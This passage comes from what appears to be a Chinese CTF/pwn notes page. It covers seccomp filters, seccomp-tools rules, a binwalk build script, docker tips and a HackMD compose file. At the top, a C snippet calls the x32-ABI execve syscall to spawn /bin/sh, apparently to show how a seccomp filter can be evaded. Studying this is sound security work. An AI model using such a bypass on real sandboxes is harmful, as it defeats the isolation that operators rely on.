</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_SECCOMP</span><span class="p">,</span> <span class="n">SECCOMP_MODE_FILTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sfp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span> <span class="n">filename</span> <span class="o">=</span> <span class="s">&#34;/bin/sh&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&#34;i will give you a shell</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="mi">24</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&#34;1234567812345678&#34;</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">syscall</span><span class="p">(</span><span class="mh">0x4000003b</span><span class="p">,</span><span class="n">filename</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="n">envp</span><span class="p">);</span><span class="c1">//execve
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * seccomp actions
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Kill the process
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define SCMP_ACT_KILL		0x00000000U
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Throw a SIGSYS signal
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define SCMP_ACT_TRAP		0x00030000U
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Return the specified error code
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define SCMP_ACT_ERRNO(x)	(0x00050000U | ((x) &amp; 0x0000ffffU))
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Notify a tracing process with the specified value
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define SCMP_ACT_TRACE(x)	(0x7ff00000U | ((x) &amp; 0x0000ffffU))
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Allow the syscall to be executed after the action has been logged
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define SCMP_ACT_LOG		0x7ffc0000U
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Allow the syscall to be executed
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define SCMP_ACT_ALLOW		0x7fff0000U
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>seccomp-tools asm rule.asm -a amd64 -f raw | seccomp-tools disasm -</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">==</span> <span class="n">ARCH_X86_64</span> <span class="o">?</span> <span class="nl">next</span> <span class="p">:</span> <span class="n">dead</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">==</span> <span class="n">close</span> <span class="o">?</span> <span class="nl">dead</span> <span class="p">:</span> <span class="n">next</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">==</span> <span class="n">exit_group</span> <span class="o">?</span> <span class="nl">dead</span> <span class="p">:</span> <span class="n">next</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">==</span> <span class="n">open</span> <span class="o">?</span> <span class="nl">next</span> <span class="p">:</span> <span class="n">allow</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">&amp;=</span> <span class="mh">0xff</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">==</span> <span class="mh">0x7c</span> <span class="o">?</span> <span class="nl">dead</span> <span class="p">:</span> <span class="n">next</span>
</span></span><span class="line"><span class="cl"><span class="nl">allow</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">ALLOW</span>
</span></span><span class="line"><span class="cl"><span class="nl">dead</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nf">ERRNO</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>seccomp-tools asm rule.asm -a amd64  -f carray</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">secc</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bpf</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">192</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">231</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">124</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_NO_NEW_PRIVS</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">sock_fprog</span> <span class="n">sfp</span> <span class="o">=</span> <span class="p">{</span><span class="mi">11</span><span class="p">,</span><span class="n">bpf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_SECCOMP</span><span class="p">,</span> <span class="n">SECCOMP_MODE_FILTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sfp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="asan可以检测到内存泄露的几种方式">asan可以检测到内存泄露的几种方式</h2>
<ul>
<li>将申请的堆块传递给栈变量，不使用exit退出，而是使用直接返回的方式退出</li>
<li>将申请的堆块赋值给全局变量，需要赋值两次</li>
<li>假设有结构体，赋值给全局变量，只free了整个结构体</li>
<li>给局部变量申请一个堆块之后再申请一个堆块</li>
</ul>
<h2 id="vscode-常用扩展">vscode 常用扩展</h2>
<h3 id="intellicode">intellicode</h3>
<h3 id="tabnine">tabnine</h3>
<h2 id="安装ret-sync">安装ret-sync</h2>
<h2 id="docker-gdbserver调试">docker gdbserver调试</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo docker run -tid --security-opt <span class="nv">seccomp</span><span class="o">=</span>unconfined -p 127.0.0.1:2333:2333
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="docker-image上传dockerhub">docker image上传dockerhub</h2>
<p>在dockerhub上新建一个docker仓库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo docker tag imageid username/仓库名字:容器名字
</span></span><span class="line"><span class="cl">sudo docker push username/仓库名字:容器名字
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="docker-build的时候使用代理">docker build的时候使用代理</h2>
<p>后面加一个参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">--</span><span class="n">build</span><span class="o">-</span><span class="n">arg</span> <span class="n">https_proxy</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.223.164</span><span class="p">:</span><span class="mi">2222</span> <span class="o">--</span><span class="n">build</span><span class="o">-</span><span class="n">arg</span> <span class="n">http_proxy</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.223.164</span><span class="p">:</span><span class="mi">2222</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="解包类的指令尽量不要在共享文件夹中使用">解包类的指令尽量不要在共享文件夹中使用！！！</h2>
<h2 id="binwalk安装">binwalk安装</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pip3</span> <span class="n">install</span> <span class="n">git</span><span class="o">+</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">ReFirmLabs</span><span class="o">/</span><span class="n">binwalk</span><span class="o">.</span><span class="n">git</span> <span class="o">--</span><span class="n">user</span>
</span></span><span class="line"><span class="cl"><span class="n">pip3</span> <span class="n">install</span> <span class="n">pycryptodome</span> <span class="o">--</span><span class="n">user</span>
</span></span><span class="line"><span class="cl"><span class="n">pip3</span> <span class="n">install</span> <span class="n">matplotlib</span> <span class="n">PyQt5</span> <span class="n">pyqtgraph</span> <span class="o">--</span><span class="n">user</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">libxkbcommon</span><span class="o">-</span><span class="n">x11</span><span class="o">-</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">pip3</span> <span class="n">install</span> <span class="n">capstone</span> <span class="o">--</span><span class="n">user</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">mtd</span><span class="o">-</span><span class="n">utils</span> <span class="n">gzip</span> <span class="n">bzip2</span> <span class="n">tar</span> <span class="n">arj</span> <span class="n">lhasa</span> <span class="n">p7zip</span> <span class="n">p7zip</span><span class="o">-</span><span class="n">full</span> <span class="n">cabextract</span> <span class="n">cramfsswap</span> <span class="n">squashfs</span><span class="o">-</span><span class="n">tools</span> <span class="n">sleuthkit</span> <span class="n">default</span><span class="o">-</span><span class="n">jdk</span> <span class="n">lzop</span> <span class="n">srecord</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">build</span><span class="o">-</span><span class="n">essential</span> <span class="n">liblzma</span><span class="o">-</span><span class="n">dev</span> <span class="n">liblzo2</span><span class="o">-</span><span class="n">dev</span> <span class="n">zlib1g</span><span class="o">-</span><span class="n">dev</span>
</span></span><span class="line"><span class="cl"><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">devttys0</span><span class="o">/</span><span class="n">sasquatch</span>
</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="n">sasquatch</span>
</span></span><span class="line"><span class="cl"><span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">downloads</span><span class="o">.</span><span class="n">sourceforge</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">project</span><span class="o">/</span><span class="n">squashfs</span><span class="o">/</span><span class="n">squashfs</span><span class="o">/</span><span class="n">squashfs4</span><span class="mf">.3</span><span class="o">/</span><span class="n">squashfs4</span><span class="mf">.3</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
</span></span><span class="line"><span class="cl"><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="n">squashfs4</span><span class="mf">.3</span>
</span></span><span class="line"><span class="cl"><span class="n">tar</span> <span class="o">-</span><span class="n">zxvf</span> <span class="n">squashfs4</span><span class="mf">.3</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="n">squashfs4</span><span class="mf">.3</span>
</span></span><span class="line"><span class="cl"><span class="n">patch</span> <span class="o">-</span><span class="n">p0</span> <span class="o">&lt;</span> <span class="o">../</span><span class="n">patches</span><span class="o">/</span><span class="n">patch0</span><span class="o">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="n">squashfs</span><span class="o">-</span><span class="n">tools</span>
</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="n">LZMA</span><span class="o">/</span><span class="n">lzmadaptive</span><span class="o">/</span><span class="n">C</span><span class="o">/</span><span class="mi">7</span><span class="nb">zip</span><span class="o">/</span><span class="n">Compress</span><span class="o">/</span><span class="n">LZMA</span><span class="o">/</span>
</span></span><span class="line"><span class="cl"><span class="n">mv</span> <span class="n">LZMA</span><span class="o">.</span><span class="n">h</span> <span class="n">LZMA2</span><span class="o">.</span><span class="n">h</span>
</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">../../../../../../</span><span class="n">LZMA</span><span class="o">/</span><span class="n">lzmalt</span><span class="o">/</span>
</span></span><span class="line"><span class="cl"><span class="n">mv</span> <span class="n">LZMA</span><span class="o">.</span><span class="n">h</span> <span class="n">LZMA3</span><span class="o">.</span><span class="n">h</span>
</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">../../</span>
</span></span><span class="line"><span class="cl"><span class="n">sed</span> <span class="o">-</span><span class="n">i</span> <span class="s2">&#34;s/#include </span><span class="se">\&#34;</span><span class="s2">LZMA.h</span><span class="se">\&#34;</span><span class="s2">/#include </span><span class="se">\&#34;</span><span class="s2">LZMA2.h</span><span class="se">\&#34;</span><span class="s2">/g&#34;</span> <span class="n">LZMA</span><span class="o">/</span><span class="n">lzmadaptive</span><span class="o">/</span><span class="n">C</span><span class="o">/</span><span class="mi">7</span><span class="nb">zip</span><span class="o">/</span><span class="n">Compress</span><span class="o">/</span><span class="n">LZMA</span><span class="o">/</span><span class="n">LZMADecoder</span><span class="o">.</span><span class="n">h</span>
</span></span><span class="line"><span class="cl"><span class="n">sed</span> <span class="o">-</span><span class="n">i</span> <span class="s2">&#34;s/#include </span><span class="se">\&#34;</span><span class="s2">LZMA.h</span><span class="se">\&#34;</span><span class="s2">/#include </span><span class="se">\&#34;</span><span class="s2">LZMA2.h</span><span class="se">\&#34;</span><span class="s2">/g&#34;</span> <span class="n">LZMA</span><span class="o">/</span><span class="n">lzmadaptive</span><span class="o">/</span><span class="n">C</span><span class="o">/</span><span class="mi">7</span><span class="nb">zip</span><span class="o">/</span><span class="n">Compress</span><span class="o">/</span><span class="n">LZMA</span><span class="o">/</span><span class="n">LZMAEncoder</span><span class="o">.</span><span class="n">h</span>
</span></span><span class="line"><span class="cl"><span class="n">sed</span> <span class="o">-</span><span class="n">i</span> <span class="s2">&#34;s/#include </span><span class="se">\&#34;</span><span class="s2">LZMA.h</span><span class="se">\&#34;</span><span class="s2">/#include </span><span class="se">\&#34;</span><span class="s2">LZMA3.h</span><span class="se">\&#34;</span><span class="s2">/g&#34;</span> <span class="n">LZMA</span><span class="o">/</span><span class="n">lzmalt</span><span class="o">/</span><span class="n">LZMADecoder</span><span class="o">.</span><span class="n">h</span>
</span></span><span class="line"><span class="cl"><span class="n">make</span>
</span></span><span class="line"><span class="cl"><span class="n">cp</span> <span class="o">./</span><span class="n">sasquatch</span> <span class="o">~/.</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span>
</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">../../../</span>
</span></span><span class="line"><span class="cl"><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="n">sasquatch</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">liblzma</span><span class="o">-</span><span class="n">dev</span>
</span></span><span class="line"><span class="cl"><span class="n">pip2</span> <span class="n">install</span> <span class="n">pyliblzma</span> <span class="n">cstruct</span> <span class="o">--</span><span class="n">user</span>
</span></span><span class="line"><span class="cl"><span class="n">pip2</span> <span class="n">install</span> <span class="n">git</span><span class="o">+</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">sviehb</span><span class="o">/</span><span class="n">jefferson</span><span class="o">.</span><span class="n">git</span> <span class="o">--</span><span class="n">user</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">liblzo2</span><span class="o">-</span><span class="n">dev</span>
</span></span><span class="line"><span class="cl"><span class="n">pip3</span> <span class="n">install</span> <span class="n">python</span><span class="o">-</span><span class="n">lzo</span>
</span></span><span class="line"><span class="cl"><span class="n">pip3</span> <span class="n">install</span> <span class="n">git</span><span class="o">+</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">jrspruitt</span><span class="o">/</span><span class="n">ubi_reader</span><span class="o">.</span><span class="n">git</span> <span class="o">--</span><span class="n">user</span>
</span></span><span class="line"><span class="cl"><span class="n">pip2</span> <span class="n">install</span> <span class="n">git</span><span class="o">+</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">devttys0</span><span class="o">/</span><span class="n">yaffshiv</span> <span class="o">--</span><span class="n">user</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hackmd">hackmd</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;3&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">services</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">database</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">postgres:11.6-alpine</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">environment</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">POSTGRES_USER=codimd</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">POSTGRES_PASSWORD=change_password</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">POSTGRES_DB=codimd</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;database-data:/var/lib/postgresql/data&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l">always</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">codimd</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">hackmdio/hackmd:2.3.2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">environment</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">CMD_DB_URL=postgres://codimd:change_password@database/codimd</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">CMD_USECDN=false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">database</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">ports</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;3000:3000&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">upload-data:/home/hackmd/app/public/uploads</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l">always</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">volumes</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">database-data</span><span class="p">:</span><span class="w"> </span>{}<span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">upload-data</span><span class="p">:</span><span class="w"> </span>{}<span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="maze">maze</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
